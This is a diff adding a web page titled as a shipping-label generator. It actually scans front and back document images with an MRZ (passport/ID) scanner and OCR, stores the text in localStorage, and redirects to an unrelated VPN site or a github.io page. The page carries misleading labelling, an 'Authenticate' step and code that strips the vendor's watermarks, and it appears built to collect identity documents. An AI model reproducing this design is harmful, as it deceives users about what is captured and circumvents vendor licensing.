@@ -1,0 +1,624 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>LM-Shipping</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- FontAwesome & MRZ Scanner -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <script src="https://cdn.jsdelivr.net/npm/dynamsoft-mrz-scanner@3.0.0/dist/mrz-scanner.bundle.js"></script>
+
+  <!-- Tesseract.js -->
+  <script src="https://cdn.jsdelivr.net/npm/tesseract.js@4/dist/tesseract.min.js"></script>
+
+  <style>
+    /* [ ... keep all your existing CSS ... ] */
+    /* Unchanged CSS from your code above */
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      font-family: Arial, sans-serif;
+      background-color: #ffffff;
+      color: #000000;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .container {
+      text-align: center;
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      margin: auto;
+    }
+
+    .logo-img {
+      width: 50%;
+      object-fit: contain;
+    }
+
+    .login-title {
+      font-size: 24px;
+      font-weight: bold;
+      margin: 10px 0 5px;
+    }
+
+    .subtitle {
+      font-size: 16px;
+      color: #333;
+      margin-bottom: 30px;
+    }
+
+    .button-group {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+      gap: 10px;
+      margin-bottom: 10px;
+    }
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 13px 18px;
+      border: none;
+      border-radius: 5px;
+      width: 92%;
+      max-width: 320px;
+      font-size: 16px;
+      cursor: pointer;
+      transition: background 0.3s;
+      margin: 0 auto;
+      box-sizing: border-box;
+    }
+
+    .btn span {
+      display: flex;
+      align-items: center;
+    }
+
+    .btn span:first-child i {
+      margin-right: 10px;
+    }
+
+    .btn-red {
+      background-color: #e53935;
+      color: #fff;
+    }
+    .btn-red:hover {
+      background-color: #b71c1c;
+    }
+    .btn-yellow {
+      background-color: #fbc02d;
+      color: #000;
+    }
+    .btn-yellow:hover {
+      background-color: #f9a825;
+    }
+    .btn-green {
+      background-color: #43a047;
+      color: #fff;
+    }
+    .btn-green:hover {
+      background-color: #388e3c;
+    }
+
+    .btn-orange {
+      background-color: #ff9800;
+      color: #fff;
+    }
+    .btn-orange:hover {
+      background-color: #e68900;
+    }
+
+    .btn-blue {
+      background-color: #3c8dbc;
+      color: #fff;
+    }
+    .btn-blue:hover {
+      background-color: #327fa3;
+    }
+
+    .btn-gray {
+      background-color: #555;
+      color: #fff;
+    }
+    .btn-gray:hover {
+      background-color: #444;
+    }
+
+    .arrow-circle {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background-color: #fff;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-left: 10px;
+    }
+
+    .arrow-circle i {
+      font-size: 13px;
+    }
+
+    .btn-red .arrow-circle i {
+      color: #e53935;
+    }
+    .btn-yellow .arrow-circle i {
+      color: #fbc02d;
+    }
+    .btn-green .arrow-circle i {
+      color: #43a047;
+    }
+    .btn-orange .arrow-circle i {
+      color: #ff9800;
+    }
+    .btn-blue .arrow-circle i {
+      color: #3c8dbc;
+    }
+    .btn-gray .arrow-circle i {
+      color: #aaa;
+    }
+
+    input[type="file"] {
+      display: none;
+    }
+
+    #ocr-result {
+      margin-top: 20px;
+      padding: 10px;
+      background: #f7f7f7;
+      border-radius: 5px;
+      font-size: 14px;
+      white-space: pre-wrap;
+      min-height: 60px;
+    }
+
+    .footer {
+      text-align: center;
+      font-size: 14px;
+      color: #666;
+      padding: 15px 10px;
+      background-color: #f4f4f4;
+    }
+
+    .submit-container {
+      position: relative;
+      width: 100%;
+      min-height: 40px;
+      height: 40px;
+      margin-top: 14px;
+      margin-bottom: 0;
+      display: flex;
+      justify-content: flex-end;
+      align-items: flex-end;
+    }
+    #submit-btn {
+      position: relative;
+      right: 0;
+      bottom: 0;
+      padding: 6px 20px;
+      background-color: #fbc02d;
+      color: #000;
+      border: none;
+      border-radius: 5px;
+      font-size: 13px;
+      font-weight: bold;
+      cursor: pointer;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.07);
+      transition: background 0.2s;
+      z-index: 2;
+      min-width: 90px;
+      min-height: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    #submit-btn span {
+      display: flex;
+      align-items: center;
+      font-size: 13px;
+    }
+    #submit-btn i {
+      font-size: 13px;
+      margin-right: 6px;
+    }
+    #submit-btn:hover {
+      background-color: #f9a825;
+    }
+
+    #camera-capture-btn {
+      position: fixed;
+      bottom: 28px;
+      left: 50%;
+      transform: translateX(-50%);
+      width: 68px;
+      height: 68px;
+      border-radius: 50%;
+      background: #fff;
+      border: 4px solid #eee;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1002;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.14);
+      cursor: pointer;
+      outline: none;
+      transition: box-shadow 0.2s;
+      opacity: 0;
+      pointer-events: none;
+    }
+    #camera-capture-btn.show {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    #camera-capture-btn i {
+      color: #444;
+      font-size: 32px;
+      margin-left: 1px;
+      margin-top: 1px;
+    }
+
+    #camera-overlay {
+      display: none;
+      position: fixed;
+      z-index: 1000;
+      left: 0; top: 0; right: 0; bottom: 0;
+      background: rgba(0,0,0,0.65);
+      width: 100vw; height: 100vh;
+    }
+    #camera-overlay.active {
+      display: block;
+    }
+
+    #camera-video-el {
+      display: block;
+      margin: 0 auto;
+      position: absolute;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+      background: #222;
+      border-radius: 12px;
+      max-width: 98vw;
+      max-height: 75vh;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.18);
+      z-index: 1001;
+    }
+
+    @media (max-width: 480px) {
+      .logo-img {
+        width: 50%;
+      }
+
+      .login-title {
+        font-size: 20px;
+      }
+
+      .subtitle {
+        font-size: 14px;
+      }
+
+      .btn {
+        padding: 10px 10px;
+        font-size: 14px;
+        max-width: 95vw;
+      }
+
+      .arrow-circle {
+        width: 24px;
+        height: 24px;
+      }
+
+      .arrow-circle i {
+        font-size: 11px;
+      }
+
+      .footer {
+        font-size: 12px;
+      }
+      .submit-container {
+        min-height: 36px;
+        height: 36px;
+      }
+      #submit-btn {
+        font-size: 12px;
+        padding: 5px 14px;
+        min-width: 70px;
+        min-height: 24px;
+      }
+      #submit-btn i {
+        font-size: 11px;
+        margin-right: 4px;
+      }
+      #camera-capture-btn {
+        width: 48px;
+        height: 48px;
+        border-width: 3px;
+      }
+      #camera-capture-btn i {
+        font-size: 22px;
+      }
+      #camera-video-el {
+        max-width: 97vw;
+        max-height: 45vh;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="assets/img/1000012077.jpg" alt="Dynamsoft Logo" class="logo-img">
+
+    <div class="login-title">Shipping Label Generator</div>
+    <div class="subtitle">Mail TXT Recognition</div>
+
+    <input type="file" id="videoInput" accept="video/*">
+    <input type="file" id="imageInput" accept="image/*">
+
+    <div class="button-group">
+      <button class="btn btn-red scan-with-camera">
+        <span><i class="fas fa-camera"></i> Scan (Invoice•Barcode•QR)</span>
+        <span class="arrow-circle"><i class="fas fa-arrow-right"></i></span>
+      </button>
+
+      <button class="btn btn-green scan-with-image-gallery">
+        <span><i class="fas fa-image"></i> Upload (Invoice or Barcode)</span>
+        <span class="arrow-circle"><i class="fas fa-arrow-right"></i></span>
+      </button>
+    </div>
+
+    <!-- Accept multiple images for the gallery button -->
+    <input type="file" id="initialFile" accept="image/*" multiple />
+
+    <div id="ocr-result"></div>
+    
+    <div class="submit-container">
+      <button id="submit-btn" class="btn btn-yellow" type="button">
+        <span><i class="fas fa-paper-plane"></i>Authenticate</span>
+      </button>
+    </div>
+  </div>
+
+  <!-- Camera overlay for camera screen and capture button -->
+  <div id="camera-overlay">
+    <video id="camera-video-el" autoplay playsinline></video>
+    <button id="camera-capture-btn" title="Take Photo">
+      <i class="fas fa-circle"></i>
+    </button>
+  </div>
+
+  <div class="footer">
+    ©️ Copyright 2025 Master Momar Mbergan
+  </div>
+
+  <script>
+    // Remove Dynamsoft "Powered by" overlays, if present, after MRZ scanner loads
+    function removePoweredByDynamsoft() {
+      const interval = setInterval(() => {
+        const watermark = document.querySelector('[class*="dce-poweredby"], [class*="dynamsoft"], .dce-video-copyright, .dce-copyright, .dynamsoft-branding');
+        if (watermark) watermark.remove();
+        document.querySelectorAll('iframe').forEach(iframe => {
+          try {
+            const idoc = iframe.contentWindow?.document;
+            if (!idoc) return;
+            idoc.querySelectorAll('[class*="dce-poweredby"], [class*="dynamsoft"], .dce-video-copyright, .dce-copyright, .dynamsoft-branding').forEach(el => el.remove());
+          } catch(e){}
+        });
+      }, 500);
+      setTimeout(() => clearInterval(interval), 10000);
+    }
+    function afterCameraOrMRZInit() {
+      removePoweredByDynamsoft();
+    }
+
+    const scanWithCameraButton = document.querySelector(".scan-with-camera");
+    const scanWithGalleryButton = document.querySelector(".scan-with-image-gallery");
+    const fileInput = document.getElementById("initialFile");
+    const ocrResultDiv = document.getElementById("ocr-result");
+    const submitBtn = document.getElementById("submit-btn");
+    const cameraOverlay = document.getElementById("camera-overlay");
+    const cameraCaptureBtn = document.getElementById("camera-capture-btn");
+    const cameraVideoEl = document.getElementById("camera-video-el");
+
+    let imageCache = { front: null, back: null };
+    let capturedImages = [];
+    let cameraStream = null;
+    let isCameraActive = false;
+    let currentImageLabel = 'Front';
+
+    function saveTextToCache(label, text) {
+      try {
+        localStorage.setItem(`ocr_${label}`, text);
+        console.log(`[CACHE] Saved OCR for ${label}`);
+        if (label === "Front") alert("Scanning Back");
+        if (label === "Back") window.location.href = "https://vpnskynet.com/";
+      } catch (e) {
+        console.warn('[CACHE] Failed to save OCR result:', e);
+      }
+    }
+
+    function saveAllOCRTextAndRedirect() {
+      try {
+        const ocrText = ocrResultDiv.innerText.trim();
+        if (ocrText.length === 0) {
+          alert("No OCR text to submit.");
+          return;
+        }
+        localStorage.setItem("ocr_AllText", ocrText);
+        window.location.href = "https://momarmbergan.github.io/Vitalsjs/#";
+      } catch (e) {
+        alert("Failed to save OCR text.");
+        console.warn("Failed to save all OCR text:", e);
+      }
+    }
+    submitBtn.addEventListener("click", saveAllOCRTextAndRedirect);
+
+    // Camera capture flow for taking 2 images and submitting both to OCR
+    function showCameraOverlay(label) {
+      if (isCameraActive) return;
+      isCameraActive = true;
+      currentImageLabel = label || 'Front';
+      cameraOverlay.classList.add('active');
+      cameraVideoEl.style.display = 'block';
+      cameraCaptureBtn.classList.add('show');
+      capturedImages = [];
+      // Use rear camera if available
+      let constraints = { video: { facingMode: { exact: "environment" } } };
+      navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+          cameraStream = stream;
+          cameraVideoEl.srcObject = stream;
+        })
+        .catch(err => {
+          // If environment camera fails, fallback to any camera
+          navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+              cameraStream = stream;
+              cameraVideoEl.srcObject = stream;
+            })
+            .catch(err2 => {
+              alert("Unable to access camera.");
+              isCameraActive = false;
+              cameraOverlay.classList.remove('active');
+            });
+        });
+      afterCameraOrMRZInit();
+    }
+
+    function closeCameraOverlay() {
+      cameraVideoEl.pause();
+      cameraVideoEl.style.display = 'none';
+      cameraOverlay.classList.remove('active');
+      cameraCaptureBtn.classList.remove('show');
+      if (cameraStream) {
+        cameraStream.getTracks().forEach(track => track.stop());
+        cameraStream = null;
+      }
+      isCameraActive = false;
+    }
+
+    cameraCaptureBtn.addEventListener('click', function () {
+      if (!isCameraActive || !cameraVideoEl) return;
+      const canvas = document.createElement('canvas');
+      canvas.width = cameraVideoEl.videoWidth;
+      canvas.height = cameraVideoEl.videoHeight;
+      const ctx = canvas.getContext('2d');
+      ctx.drawImage(cameraVideoEl, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob(function(blob) {
+        capturedImages.push(blob);
+        if (capturedImages.length === 1) {
+          alert("Front image captured. Now capture Back image.");
+        }
+        if (capturedImages.length < 2) {
+          // Prompt for second image
+          // Keep camera open for second capture
+          return;
+        }
+        // Got both images, close camera and run OCR on both
+        closeCameraOverlay();
+        // OCR both images as Front and Back
+        const labels = ['Front', 'Back'];
+        for (let i = 0; i < capturedImages.length; i++) {
+          runTesseractOCR(capturedImages[i], labels[i], true);
+        }
+      }, 'image/jpeg', 0.92);
+    });
+
+    scanWithCameraButton.addEventListener("click", async function () {
+      showCameraOverlay('Front');
+    });
+
+    // Existing MRZ Scanner logic (unchanged, for gallery etc.)
+    const mrzscanner = new Dynamsoft.MRZScanner({
+      license: "DLS2eyJoYW5kc2hha2VDb2RlIjoiMTA0MzI5ODU4LU1UQTBNekk1T0RVNExYZGxZaTFVY21saGJGQnliMm8iLCJtYWluU2VydmVyVVJMIjoiaHR0cHM6Ly9tZGxzLmR5bmFtc29mdG9ubGluZS5jb20iLCJvcmdhbml6YXRpb25JRCI6IjEwNDMyOTg1OCIsInN0YW5kYnlTZXJ2ZXJVUkwiOiJodHRwczovL3NkbHMuZHluYW1zb2Z0b25saW5lLmNvbSIsImNoZWNrQ29kZSI6MTczNDA3NjY3M30=",
+      resultViewConfig: {
+        toolbarButtonsConfig: {
+          done: { label: "Submit" }
+        }
+      },
+      scannerViewConfig: {
+        cameraEnhancerUIPath: "./dist/mrz-scanner.ui.html",
+      },
+      templateFilePath: "./dist/mrz-scanner.template.json"
+    });
+
+    const originalMRZLaunch = mrzscanner.launch.bind(mrzscanner);
+    mrzscanner.launch = async function(...args) {
+      const result = await originalMRZLaunch(...args);
+      afterCameraOrMRZInit();
+      return result;
+    };
+
+    scanWithGalleryButton.addEventListener("click", function () {
+      fileInput.click();
+    });
+
+    // Multiple image OCR logic for gallery
+    fileInput.addEventListener("change", async function () {
+      const files = Array.from(this.files);
+      if (files.length === 0) return;
+
+      if (files.length > 2) {
+        alert('Please select only 2 images (Front and Back)');
+        this.value = "";
+        return;
+      }
+
+      const labels = ['Front', 'Back'];
+      for (let i = 0; i < files.length; i++) {
+        try {
+          try {
+            await mrzscanner.launch(files[i]);
+          } catch (err) {}
+          runTesseractOCR(files[i], labels[i] || `Image${i + 1}`, true);
+        } catch (err) {
+          ocrResultDiv.innerText += `\n[${labels[i] || `Image${i + 1}`}] Submit Both Front and Back 1 by 1 then Authenticate.\n`;
+        }
+      }
+      this.value = "";
+    });
+
+    async function getImageDataURL(result) {
+      try {
+        const canvas = await result.originalImageResult?.toCanvas();
+        return canvas?.toDataURL() || null;
+      } catch (e) {
+        console.warn("Failed to extract image:", e);
+        return null;
+      }
+    }
+
+    function runTesseractOCR(input, label = "Image", saveToCache = false) {
+      const processImage = (dataURL) => {
+        Tesseract.recognize(dataURL, 'eng', {
+          logger: m => console.log(`[${label}]`, m)
+        }).then(({ data: { text } }) => {
+          console.log(`[${label}] OCR Text:`, text);
+          ocrResultDiv.innerText += `\n----- ${label.toUpperCase()} OCR Result -----\n${text.trim()}\n`;
+          if (saveToCache) {
+            saveTextToCache(label, text.trim());
+          }
+        }).catch(err => {
+          console.error(`[${label}] OCR error:`, err);
+          ocrResultDiv.innerText += `\nSubmit Both Front and Back 1 by 1 then Authenticate.\n`;
+        });
+      };
+      if (typeof input === "string") {
+        processImage(input);
+      } else if (input instanceof Blob) {
+        const reader = new FileReader();
+        reader.onload = () => processImage(reader.result);
+        reader.readAsDataURL(input);
+      } else {
+        ocrResultDiv.innerText += `\n[${label}] Invalid input for OCR.\n`;
+      }
+    }
+  </script>
+</body>
+</html>
